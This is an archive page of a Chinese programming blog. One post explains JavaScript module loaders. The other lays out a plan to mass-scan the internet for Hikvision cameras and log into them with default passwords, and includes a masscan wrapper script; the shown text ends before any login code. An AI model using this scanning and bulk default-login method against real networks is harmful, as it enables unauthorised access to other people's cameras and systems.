<!doctype html>
<html class="theme-next   use-motion ">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>




  
    <link href='//fonts.lug.ustc.edu.cn/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
  



<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Reverland, Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="Reverland的行知阁" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/images/default_avatar.jpg?v=0.4.5.2" />






<meta name="description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta property="og:type" content="website">
<meta property="og:title" content="Reverland的行知阁">
<meta property="og:url" content="http://reverland.org/page/3/index.html">
<meta property="og:site_name" content="Reverland的行知阁">
<meta property="og:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Reverland的行知阁">
<meta name="twitter:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">



<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: '',
    sidebar: 'post',
    motion: true
  };
</script>

  <title> Reverland的行知阁 </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  






  <div class="container one-column 
   page-home 
">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Reverland的行知阁</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">开放、分享、自由与进步</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu ">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-user fa-fw"></i> <br />
            
            关于
          </a>
        </li>
      

      
      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content">
          
  <section id="posts" class="posts-expand">

    

    
    

    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/javascript/2015/05/02/javascript/" itemprop="url">
                  javascript模块机制原理
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-05-02T00:00:00+08:00" content="2015-05-02">
              2015-05-02
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/javascript/" itemprop="url" rel="index">
                    <span itemprop="name">javascript</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/javascript/2015/05/02/javascript/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="javascript/2015/05/02/javascript/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>eloquent javascript是一本浸润着黑客精神和文化的书，上一次看到这样的书还是在三年前，那本书叫land of lisp。</p>
<p>这是关于eloquent js第十章，模块化的一些解释。因为我觉得这部分不好理解。</p>
<h2 id="js模块化基础">js模块化基础</h2><p>我们写代码时，代码总是倾向于越来越像浆糊，越是大的全的功能，越是浆糊到不堪。我们想要看清楚些，就把不同功能分出来，揉成一堆小浆糊，这总比一大团浆糊好处理。</p>
<p>当我们想把一团js浆糊放到一起时，并称之模块时，我们会设计让它提供几个功能，这个一般叫做接口。比如<code>console</code>模块有个<code>log</code>功能，比如等等。</p>
<p>我们可以把这堆浆糊扔到一个全局变量中去，这样其它部分要是想要使用这团浆糊的功能，就使用浆糊提供的接口。比如<code>Math.PI</code>可以访问得到3.14159……。</p>
<p>这很简单，js提供了函数来隔离命名空间，对象来放置模块内容。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mod1 = <span class="function"><span class="keyword">function</span> <span class="title">mod1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">3</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(x+i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;a:<span class="number">1</span>,</span><br><span class="line">            b:print</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>
<p>为啥要这样写呢，因为，假如我们不想让人看到局部变量<code>i</code>，函数是我们唯一能借以创建局部作用域的东西。</p>
<p>这就是javascript模块化的基础。</p>
<p>这样，我们想调用某个模块时，就把某个函数包裹着的东西给全局变量，调用者对这个全局变量进行操作就好。</p>
<p><code>return</code>的时候写一大堆对象内容也不合适，我们可以选择传进去个对象。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mod2 = &#123;&#125;;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">exports</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">3</span>;</span><br><span class="line">    exports.a = i;</span><br><span class="line">    exports.b = <span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(x+i);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;(mod2))</span><br></pre></td></tr></table></figure>
<p>但是。。。</p>
<p>当这所有都得需要在全局作用域内进行。</p>
<ol>
<li><p>想想当我们要两个模块a和b都被c依赖，a依赖c0.1版而b依赖c0.2版，a和b中调用名字为c的模块。。。</p>
</li>
<li><p>或者a依赖b然后c依赖d，然而b在a中命名为xx，d在c中也命名为xx。</p>
</li>
</ol>
<p>所以，最好不通过全局作用域实现模块依赖。</p>
<p>但实际上可以做到不需要全局作用域来实现模块的依赖.接下来讨论两种常见的方案。</p>
<h2 id="向CommonJS跃进">向CommonJS跃进</h2><p>写过node程序的人都见过类似的东西</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mod3 = <span class="built_in">require</span>(<span class="string">"mod3"</span>);</span><br></pre></td></tr></table></figure>
<p>在该模块中通过require函数引入模块，并通过变量mod3引用这个模块。不需要通过全局变量，该模块高明地引用了其它模块。</p>
<p>require实现方式如下， 通过<code>Function</code>构造函数构造函数实现命名空间, 假设我们有个read函数。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">require</span>(<span class="params">modName</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> code = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"exports"</span>, read(modName));</span><br><span class="line">    <span class="keyword">var</span> exports = &#123;&#125;;</span><br><span class="line">    code(exports);</span><br><span class="line">    <span class="keyword">return</span> exports;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样做，每次载入都会运行模块，即使有多个模块载入一个名字的模块也会运行多次。<br>我们加个全局变量保存已经加载的模块。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>.cache = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">require</span>(<span class="params">modName</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (modName <span class="keyword">in</span> <span class="built_in">require</span>.cache) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">require</span>.cache[modName];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> code = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"exports"</span>, read(modName));</span><br><span class="line">    <span class="keyword">var</span> exports = &#123;&#125;;</span><br><span class="line">    code(exports);</span><br><span class="line">    <span class="built_in">require</span>.cache[modName] = exports;</span><br><span class="line">    <span class="keyword">return</span> exports;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在比如你想暴露个和exports对象不同的东西，比如我他妈的只想导出个函数呢，比如</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="built_in">require</span>(<span class="string">'fn'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(fn);    <span class="comment">//-&gt; 1</span></span><br></pre></td></tr></table></figure>
<p>我们可以通过额外给模块传递一个叫module的参数，这个参数<code>exports</code>属性默认指向<code>exports</code>对象实现这点。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>.cache = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">require</span>(<span class="params">modName</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (modName <span class="keyword">in</span> <span class="built_in">require</span>.cache) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">require</span>.cache[modName];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> code = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"exports, module"</span>, read(modName));</span><br><span class="line">    <span class="keyword">var</span> exports = &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">module</span> = &#123;exports: exports&#125;;</span><br><span class="line">    code(exports, <span class="built_in">module</span>);</span><br><span class="line">    <span class="built_in">require</span>.cache[modName] = <span class="built_in">module</span>.exports;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">module</span>.exports;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当模块<code>fn</code>想返回比如1时</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>这样，我们就实现了简单的nodejs模块系统：）Coooooooooooooooool</p>
<p>这有个啥问题呢？浏览器中的js程序执行时，浏览器啥也干不了= =。</p>
<p>read函数没读到模块内容之前，js程序一直执行，但除了等待什么都不干。假如这个read是从网络上读取模块文件，那么万一网络质量很差，这个系统都把大部分时间花在等文件加载上了。</p>
<p>为了解决这个问题，有人发明了<a href="http://browserify.org/" target="_blank" rel="external">browserify</a>.这，看做一个依赖打包服务吧。</p>
<p>另一种方案是：</p>
<h2 id="AMD">AMD</h2><p>这里的AMD不是AMD芯片的AMD，全称叫Asynchronous Module Definition。异步模块定义模块系统。</p>
<p>这个系统的核心，是一个叫做define的函数。</p>
<p>每个模块都必须这样写：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">define([<span class="string">"dep1"</span>, <span class="string">"dep2"</span>], <span class="function"><span class="keyword">function</span>(<span class="params">dep1, dep2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> dep1.a + dep2.b;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>假如不依赖其它模块</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">define([], <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> mod = &#123;a: <span class="number">1</span>, b: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="string">"sb"</span>)&#125;&#125;;</span><br><span class="line">    <span class="keyword">return</span> mod;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>这个核心的define函数这么设计，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">depNames, moduleFunction</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//对每个depNames中的依赖，安排异步下载</span></span><br><span class="line">    <span class="comment">//当下载都完成时，执行moduleFunction, 同时把模块接口传给它</span></span><br><span class="line">    <span class="comment">//改变其状态，通知调用者</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们要实现这个递归的过程，需要一个对象来表示其状态和存放调用者的函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> defineCache = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// 指向当前模块的指针</span></span><br><span class="line"><span class="keyword">var</span> currentMod = <span class="literal">null</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getModule</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//如果已经加载过了就返回</span></span><br><span class="line">    <span class="keyword">if</span> (name <span class="keyword">in</span> defineCache)</span><br><span class="line">        <span class="keyword">return</span> defineCache[name];</span><br><span class="line">    <span class="comment">// 否则先返回一个对象</span></span><br><span class="line">    <span class="comment">// 等模块真正下载完后更新currentMod变量，</span></span><br><span class="line">    <span class="comment">// 同时递归执行调用子模块的define函数</span></span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">module</span> = &#123;exports: <span class="literal">null</span>,</span><br><span class="line">        loaded: <span class="literal">false</span>,</span><br><span class="line">        onLoad: []&#125;;</span><br><span class="line">    defineCache[name] = <span class="built_in">module</span>;</span><br><span class="line">    <span class="comment">// 我们假设有这么个异步读取文件的函数</span></span><br><span class="line">    backgroundReadFile(name, <span class="function"><span class="keyword">function</span>(<span class="params">code</span>) </span>&#123;</span><br><span class="line">            currentMod = <span class="built_in">module</span>;</span><br><span class="line">            <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">""</span>, code)();<span class="comment">// code会是又一个define函数调用</span></span><br><span class="line">            &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">module</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">depNames, moduleFunction</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//对每个depNames中的依赖，安排异步下载</span></span><br><span class="line">    <span class="comment">//当下载都完成时，执行moduleFunction, 同时把模块接口传给它</span></span><br><span class="line">    <span class="comment">//改变其状态，通知调用者</span></span><br><span class="line">    <span class="keyword">var</span> myMod = currentMod;</span><br><span class="line">    <span class="keyword">var</span> deps = depNames.map(getModule);</span><br><span class="line"></span><br><span class="line">    deps.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">mod</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!mod.loaded)</span><br><span class="line">            <span class="comment">// 如果模块还没加载把父模块的whenDepsLoaded保存</span></span><br><span class="line">            <span class="comment">// 留待该模块完成以后调用</span></span><br><span class="line">            mod.onLoad.push(whenDepsLoaded);</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">whenDepsLoaded</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//如果依赖没有全加载好，值得一提的是[].every总是返回真</span></span><br><span class="line">        <span class="keyword">if</span> (!deps.every(<span class="function"><span class="keyword">function</span>(<span class="params">m</span>) </span>&#123; <span class="keyword">return</span> m.loaded; &#125;))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">// 如果依赖都下载完成，如果deps为[]，args=[]</span></span><br><span class="line">        <span class="keyword">var</span> args = deps.map(<span class="function"><span class="keyword">function</span>(<span class="params">m</span>) </span>&#123; <span class="keyword">return</span> m.exports; &#125;);</span><br><span class="line">        <span class="keyword">var</span> exports = moduleFunction.apply(<span class="literal">null</span>, args);</span><br><span class="line">        <span class="keyword">if</span> (myMod) &#123;    <span class="comment">//对当前模块对象进行更新</span></span><br><span class="line">            myMod.exports = exports;</span><br><span class="line">            <span class="comment">// 更新当前模块状态</span></span><br><span class="line">            myMod.loaded = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">//当前模块完成时都会调用一次依赖它的模块们的whenDepsLoaded函数</span></span><br><span class="line">            myMod.onLoad.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">f</span>) </span>&#123; f(); &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    whenDepsLoaded();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果就是:</p>
<ol>
<li><p>首先调用顶级define，define中所有依赖调用getModule去下载被依赖者代码,被依赖者的代码下载完成后会执行下一个define。</p>
</li>
<li><p>define中getModule会立即返回一个对象，这个对象保存想要加载的被依赖模块的导出接口、是否完成加载信息，和依赖它的模块的whenDepsLoaded函数。</p>
</li>
<li><p>该模块调用其whenDepsLoade函数，该函数在依赖没有全加载完时立即返回。</p>
</li>
<li><p>接下来就等待被依赖模块下载好，被依赖函数又是一个define函数。define函数重复上述过程，</p>
</li>
<li><p>此递归过程继续。直到某个没有依赖的模块</p>
</li>
<li><p>对没有依赖的模块，define中直接调用whenDepsLoaded函数，更新它的导出接口，更新它的加载状态，调用依赖它的模块的whenDepsLoaded函数。(注意js的函数作用域中的myMod)</p>
</li>
<li><p>该whenDepsLoaded函数保存了它自身的模块名和信息。如果它还有其它依赖没加载，立即返回。直到它所有依赖的模块的状态都变了，它的whenDepsLoaded函数才从此真正有了实质作用。把加载好的被依赖模块作为参数，开始真正执行模块代码(之前早就下载好的define的一部分)。之后更新它的导出接口、更新它的加载状态，调用依赖它的模块的whenDepsLoaded函数。</p>
</li>
<li><p>被依赖的模块完成后又重复过程7，不断调用更高级别的依赖者的whenDepsLoaded函数，直到所有的函数都执行完。顶级的define中的whenDepsLoaded执行完。</p>
</li>
</ol>
<p>著名的<a href="http://requirejs.org" target="_blank" rel="external">require.js</a>的设计就是这个原理。</p>
<p>我的逻辑性有点浆糊，但我觉得每种情况都说明白了，没有依赖，依赖其它，不被依赖的模块。</p>
<h2 id="接口设计原则">接口设计原则</h2><ol>
<li>可预测：不总做出乎意料的设计。</li>
<li>组件化：尽可能功能通用，提供简单的数据结构和语法。</li>
<li>分层设计：暴露不同程度的细节。</li>
</ol>
<p>综上，这都是些原理和基本原则。实际会涉及很多复杂的问题。不过，万丈高楼平地起，浮沙之上无高台，基础是深入的前提。而这个前提确是：万事开头难。</p>
<p>感谢看完的读者，希望以后碰到模块化问题都能更轻松迅速解决。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2015/04/07/python-spider-camera-find/" itemprop="url">
                  Python Spider: 海康威视摄像头发现
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-04-07T00:00:00+08:00" content="2015-04-07">
              2015-04-07
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2015/04/07/python-spider-camera-find/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2015/04/07/python-spider-camera-find/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="Hikvision视频监控系统：摄像头发现与默认密码登录(gevent)">Hikvision视频监控系统：摄像头发现与默认密码登录(gevent)</h2><blockquote>
<p>一切都在不可避免的走向庸俗</p>
<p>王小波</p>
</blockquote>
<p>挖坟= =and 最后一个爬虫。</p>
<p>缘起在去年，一个去某阿里的我并不认识的毕业师兄，这个毕业的师兄好像还写了北邮人ip到地址插件，这个师兄在毕业的时候发了一些列摆一摆贵邮的各种安全问题，其中有个摄像头默认用户名密码。结果呢，我就没登录进去那几个摄像头= =</p>
<p>警告：你所做的一切都是有迹可寻的，dont be evil。</p>
<p>我这里只举摄像头的例子。其实能做的很多，ssh服务器，ftp、数据库等等。如果对web安全漏洞比较熟悉，拿到互联网上批量挖掘都行。。。好像不是在讲爬虫了，不过我觉得爬虫就是爬取信息的工具。</p>
<p>顺便一提，最近分析了下阿里的社会招聘，顺便画了下据此得到的阿里架构图，有兴趣的同学可以一起玩.</p>
<p>大概这么几步：</p>
<ol>
<li>用高效的扫描器扫描大范围地址段，得到开放端口80的ip列表，最好还是随机而不是顺序排列的</li>
<li>对地址大海中聊若晨星般的ip进行http请求，获取服务器信息，保存下来。</li>
<li>找到某种摄像头信息的“基因”(即，这种摄像头必然返回这种信息而其它服务器不会),这里只举一个简单例子</li>
<li>批量获取弱密码摄像头</li>
</ol>
<p>首先，我们需要在unix下工作。。。我们需要辅助工具。我这里说下为什么会使用<a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="external">masscan</a>，因为他比我自己写的扫描器比<a href="https://zmap.io" target="_blank" rel="external">zmap</a>、nmap更快，快很多，虽然它们各有所长。python这里又做起了胶水语言的勾当= =</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">扫描指定端口</span><br><span class="line">usage:</span><br><span class="line">    python scan_port.py net interface port</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> popen2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.makedirs(<span class="string">'data/open_port/'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.mkdir(<span class="string">'dump'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 扫描网段内80端口, 生成列表</span></span><br><span class="line">cmd = <span class="string">"sudo masscan -i"</span> + sys.argv[<span class="number">2</span>] + \</span><br><span class="line">    <span class="string">" -p "</span> + sys.argv[<span class="number">3</span>] + <span class="string">" --rate 100000 --wait 2 -oL data/open_port/open"</span> + \</span><br><span class="line">    sys.argv[<span class="number">3</span>] + <span class="string">"_ip.temp "</span> + \</span><br><span class="line">    sys.argv[<span class="number">1</span>] + <span class="string">" &amp;&amp;\</span><br><span class="line">    cut -f4 -d' ' data/open_port/open"</span> + sys.argv[<span class="number">3</span>] + \</span><br><span class="line">    <span class="string">"_ip.temp &gt; data/open_port/open"</span> + sys.argv[<span class="number">3</span>] + <span class="string">"_ip.list &amp;&amp;\</span><br><span class="line">    rm -f data/open_port/open"</span> + sys.argv[<span class="number">3</span>] + <span class="string">"_ip.temp"</span></span><br><span class="line"><span class="keyword">print</span> cmd</span><br><span class="line"><span class="comment"># cmd = "sudo zmap -i " + sys.argv[2]  + \</span></span><br><span class="line"><span class="comment">#    " -p " + sys.argv[3] + " -o open" + sys.argv[3] + \</span></span><br><span class="line"><span class="comment">#    "_ip.list " + sys.argv[1]</span></span><br><span class="line"></span><br><span class="line">(child_stdout, child_stdin) = popen2.popen2(cmd, bufsize=-<span class="number">1</span>, mode=<span class="string">'t'</span>)</span><br><span class="line"><span class="comment"># 打印输出</span></span><br><span class="line">sys.stdout.write(child_stdout.read())</span><br></pre></td></tr></table></figure>
<p>是不是看上去特别奇葩，我把这种奇(zuo)葩(si)的行事方式叫做quick and dirty式，除了确实能用没有其它优点了(ゝ∀･)</p>
